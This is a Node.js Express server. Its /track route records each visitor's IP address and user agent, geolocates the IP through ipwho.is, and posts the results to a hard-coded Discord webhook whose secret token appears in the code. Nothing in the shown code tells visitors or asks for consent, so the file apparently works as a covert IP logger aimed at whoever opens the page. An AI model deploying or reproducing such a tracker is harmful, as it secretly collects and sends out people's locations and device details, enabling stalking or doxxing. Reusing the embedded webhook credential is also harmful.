import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";

// REQUIRED for real IPs on hosting platforms (Render, etc.)
app.set("trust proxy", true);

// Serve index.html from same folder
app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// TRACK ROUTE
app.get("/track", async (req, res) => {

    // Get real IP safely
    const rawIp =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress ||
        "";

    const ip = rawIp
        .split(",")[0]
        .replace("::ffff:", "")
        .trim();

    const userAgent = req.headers["user-agent"] || "Unknown";

    let city = "Unknown";
    let country = "Unknown";

    // Detect local IPs
    const isLocal =
        ip === "::1" ||
        ip === "127.0.0.1" ||
        ip.startsWith("192.168.") ||
        ip.startsWith("10.") ||
        ip.startsWith("172.");

    if (!isLocal && ip) {
        try {
            // ✅ MORE RELIABLE API
            const geoRes = await fetch(`https://ipwho.is/${ip}`);
            const data = await geoRes.json();

            if (data.success) {
                city = data.city || "Unknown";
                country = data.country || "Unknown";
            } else {
                // fallback if API fails
                city = "Unknown";
                country = "Unknown";
            }
        } catch (err) {
            console.error("Geo lookup failed:", err);
        }
    } else {
        city = "Local Network";
        country = "Local";
    }

    // Send to Discord webhook
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `🇵🇭 New Visitor Logged
🌍 IP: ${ip}
📍 Location: ${city}, ${country}
🖥️ Device: ${userAgent}`
            })
        });
    } catch (err) {
        console.error("Webhook failed:", err);
    }

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});
